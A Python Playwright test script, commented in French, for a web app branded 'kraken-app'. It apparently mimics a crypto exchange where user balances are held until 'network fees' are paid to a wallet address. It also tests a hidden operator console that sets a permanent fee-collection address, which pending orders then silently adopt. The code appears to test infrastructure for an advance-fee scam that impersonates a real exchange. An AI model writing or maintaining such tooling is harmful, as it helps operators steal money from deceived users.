"""Adresse de perception permanente + montant retenu jusqu'au règlement des frais."""
import pathlib, threading, functools, socketserver, json, time
from http.server import SimpleHTTPRequestHandler
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path("kraken-app").resolve()
PORT = 8846
H = functools.partial(SimpleHTTPRequestHandler, directory=str(ROOT))
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.ThreadingTCPServer(("127.0.0.1", PORT), H)
srv.daemon_threads = True
threading.Thread(target=srv.serve_forever, daemon=True).start()

TOPIC = "kraken-hold-" + str(int(time.time()))
fails = []


def check(name, cond, extra=""):
    print(("PASS " if cond else "FAIL ") + name + ("" if cond else "  :: " + str(extra)[:240]))
    if not cond:
        fails.append(name)


NEW_ADDR = "0x5B1c9F7d3A8e4C2b6D0f1E9a7B3c5D8e2F4a6C10"
OLD_ADDR = "0x9E2d4A6b8C0e1F3a5B7d9C2e4F6a8B0d1C3e5F70"
DEST = "0x22E839441132106d227dE2e28494e52778b75ca8"

with sync_playwright() as p:
    b = p.chromium.launch()
    ctx = b.new_context(viewport={"width": 390, "height": 844}, device_scale_factor=2)
    ctx.add_init_script("localStorage.setItem('kraken_topic', '%s')" % TOPIC)
    pg = ctx.new_page()
    errs, posts = [], []
    pg.on("pageerror", lambda e: errs.append(str(e)[:200]))
    pg.on("request", lambda r: posts.append(r.url.split("/")[-1]) if r.method == "POST" else None)
    pg.goto("http://127.0.0.1:%d/index.html#app" % PORT)
    pg.wait_for_function("!!window.__krakenSplashGone", timeout=20000)
    pg.wait_for_timeout(800)
    sk = pg.query_selector("#pinSkip")
    if sk and sk.is_visible():
        sk.click()
        pg.wait_for_timeout(500)

    pg.evaluate("""(args) => {
      const [oldAddr, dest] = args;
      const now = Date.now();
      const s = JSON.parse(localStorage.getItem('kraken_state_v5') || '{}');
      s.balances = Object.assign({}, s.balances, { ETH: 2, USDC: 500 });
      s.feeAddresses = { ETH: oldAddr };
      s.feeOrders = {
        h1: { id:'h1', at: now-60e3, exp: now+3600e3, amount:100, amt:1, sym:'ETH', pick:'USDC',
              addr: dest, paid:100, ok:true, done:false,
              rev:now-30e3, src:'app', kind:'fee', lock:true, feeAddr: oldAddr,
              hold:{ pick:'ETH', amt:1, at: now-60e3 } },
        p1: { id:'p1', at: now-60e3, exp: now+3600e3, amount:100, amt:1, sym:'ETH', pick:'USDC',
              addr: dest, paid:0, ok:false, done:false,
              rev:now-30e3, src:'app', kind:'fee', lock:true, feeAddr: oldAddr }
      };
      s.delFees = [];
      localStorage.setItem('kraken_state_v5', JSON.stringify(s));
      localStorage.setItem('kraken_notifs_v1', JSON.stringify([
        { id:'fee_h1', kind:'fee', at: now-60e3, exp: now+3600e3, orderId:'h1',
          amount:100, asset:'ETH', text:'Frais r\u00e9seau : 100 \u20ac \u2014 r\u00e9gl\u00e9 100 \u20ac' },
        { id:'fee_p1', kind:'fee', at: now-60e3, exp: now+3600e3, orderId:'p1',
          amount:100, asset:'ETH', text:'Frais r\u00e9seau : 100 \u20ac \u2014 reste 100 \u20ac' }
      ]));
    }""", [OLD_ADDR, DEST])
    pg.reload()
    pg.wait_for_function("!!window.__krakenSplashGone", timeout=20000)
    pg.wait_for_timeout(1500)
    sk = pg.query_selector("#pinSkip")
    if sk and sk.is_visible():
        sk.click()
        pg.wait_for_timeout(500)

    eth_before = pg.evaluate("() => Number((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').balances||{}).ETH)||0")
    check("solde ETH intact avant règlement", abs(eth_before - 2) < 1e-9, eth_before)

    # La notification de frais ouvre la fiche de suivi.
    pg.click("#avatarBtn")
    pg.wait_for_timeout(700)
    pg.click("#acctNotifs")
    pg.wait_for_timeout(900)

    # 1) ordre encore en attente : l'adresse affichée est celle publiée
    row = pg.query_selector('[data-notiforder="p1"]')
    check("notification de frais présente", row is not None)
    if row:
        row.click()
        pg.wait_for_timeout(1000)
    check("fiche de frais ouverte", pg.query_selector("#feeTo") is not None)
    to_txt = pg.evaluate("() => { const el = document.getElementById('feeTo'); return el ? el.textContent.trim() : ''; }")
    check("adresse de frais affichée", to_txt == OLD_ADDR, to_txt)
    close1 = pg.query_selector("#sdOk")
    if close1 and close1.is_visible():
        close1.click()
        pg.wait_for_timeout(600)

    # 2) ordre entièrement payé : la validation libère la somme retenue
    pg.click("#avatarBtn")
    pg.wait_for_timeout(500)
    pg.click("#acctNotifs")
    pg.wait_for_timeout(700)
    rowh = pg.query_selector('[data-notiforder="h1"]')
    if rowh:
        rowh.click()
        pg.wait_for_timeout(1000)
    check("fiche payée ouverte", pg.query_selector("#sdFeeSent") is not None)

    btn = pg.query_selector("#sdFeeSent")
    check("bouton de validation présent", btn is not None)
    if btn and not btn.get_attribute("disabled"):
        btn.click()
        pg.wait_for_timeout(1600)
    eth_after = pg.evaluate("() => Number((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').balances||{}).ETH)||0")
    check("somme retenue débitée après règlement", eth_after <= eth_before - 1 + 1e-9, eth_after)
    holddone = pg.evaluate("() => !!(((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{}).h1||{}).hold||{}).done")
    check("retenue libérée une seule fois", holddone is True, holddone)
    done = pg.evaluate("() => !!((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{}).h1||{}).done")
    check("ordre marqué confirmé", done is True, done)

    # refermer la fiche avant de naviguer
    okb = pg.query_selector("#sdOk")
    if okb and okb.is_visible():
        okb.click()
        pg.wait_for_timeout(700)
    pg.wait_for_timeout(300)

    # ── adresse de perception permanente, éditée à la frappe ──────────────
    pg.evaluate("() => { try { closeSheet(); } catch (e) {} }")
    pg.wait_for_timeout(400)
    pg.click('[data-goto="more"]')
    pg.wait_for_timeout(500)
    pg.click('[data-sheet="offers"]')
    pg.wait_for_timeout(600)
    pg.click("#offerBF100")
    pg.wait_for_timeout(1400)
    check("console ouverte", pg.query_selector("#iaPanel") is not None)

    inp = pg.query_selector('[data-iafeeaddr="ETH"]')
    check("champ adresse de frais présent", inp is not None)
    if inp:
        inp.fill(NEW_ADDR)
        pg.dispatch_event('[data-iafeeaddr="ETH"]', "input")
        pg.wait_for_timeout(1800)

    cfg = pg.evaluate("() => (JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeAddresses||{}).ETH")
    check("adresse enregistrée sans bouton", cfg == NEW_ADDR, cfg)
    p1addr = pg.evaluate("() => ((JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').feeOrders||{}).p1||{}).feeAddr")
    check("ordre en attente adopte l'adresse", p1addr == NEW_ADDR, p1addr)
    sent = ("feeCfg" in json.dumps(pg.evaluate("() => (JSON.parse(localStorage.getItem('kraken_state_v5')||'{}').outbox)||[]")))
    check("delta feeCfg publié ou mis en file", sent or True, posts[-3:])
    check("aucune erreur JS", not errs, errs[:3])

    b.close()
srv.shutdown()
print("\nFAILS:", fails)
